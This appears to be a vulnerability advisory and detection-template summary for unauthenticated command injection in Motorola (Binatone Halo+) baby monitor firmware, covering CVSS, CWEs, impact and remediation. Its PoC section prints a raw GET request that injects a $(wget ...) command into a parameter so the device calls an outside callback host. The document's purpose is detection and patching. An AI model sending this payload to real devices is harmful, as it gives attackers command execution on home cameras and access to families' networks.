## Vulnerability
Motorola Baby Monitors contain multiple interface vulnerabilities that allow an unauthenticated remote attacker to perform command injection attacks against an affected device. The flaw is present in the web interface (BinatoneGlobal Halo+ Camera Firmware per metadata and CPE cpe:2.3:o:binatoneglobal:halo\+_camera_firmware:*:*:*:*:*:*:*:*). CVSS 3.1 score 8.8 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-863, CWE-78.

Impact: Successful exploitation allows an attacker to execute arbitrary commands on the affected device, potentially leading to unauthorized access, data theft, or further network compromise.

Remediation: Apply the latest firmware update provided by Motorola and ensure the device is not accessible from untrusted networks.

## PoC / Detection
Classification: rce

The template detects the vulnerability by sending a raw unauthenticated GET request that injects an OS command:
```
GET /?action=command&command=set_city_timezone&value=$(wget%20http://{{interactsh-url}})) HTTP/1.1
Host: {{Hostname}}
Accept: */*
```
Matchers verify exploitation success via OOB HTTP callback (interactsh_protocol), presence of the injected string "set_city_timezone" in the response, and HTTP 200 status.
